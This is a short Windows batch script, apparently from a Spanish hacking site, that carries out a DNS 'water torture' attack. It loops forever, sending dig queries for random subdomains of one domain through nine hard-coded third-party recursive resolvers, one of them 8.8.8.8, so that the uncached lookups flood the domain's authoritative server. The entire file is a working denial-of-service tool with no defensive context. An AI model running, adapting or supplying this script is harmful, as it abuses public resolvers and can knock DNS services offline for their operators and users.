@ECHO OFF
ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2016. Version 3.
:loop
SET/A ran=%random%
dig @118.174.15.254 +notcp %ran%.hackingyseguridad.es
dig @200.6.250.52 +notcp %ran%.hackingyseguridad.es
dig @87.216.179.130 +notcp %ran%.hackingyseguridad.es
dig @84.232.40.254 +notcp %ran%.hackingyseguridad.es
dig @176.32.50.10 +notcp %ran%.hackingyseguridad.es
dig @89.29.190.9 +notcp %ran%.hackingyseguridad.es
dig @217.18.160.147 +notcp %ran%.hackingyseguridad.es
dig @85.112.29.175 +notcp %ran%.hackingyseguridad.es
dig @8.8.8.8 +notcp %ran%.hackingyseguridad.es
goto loop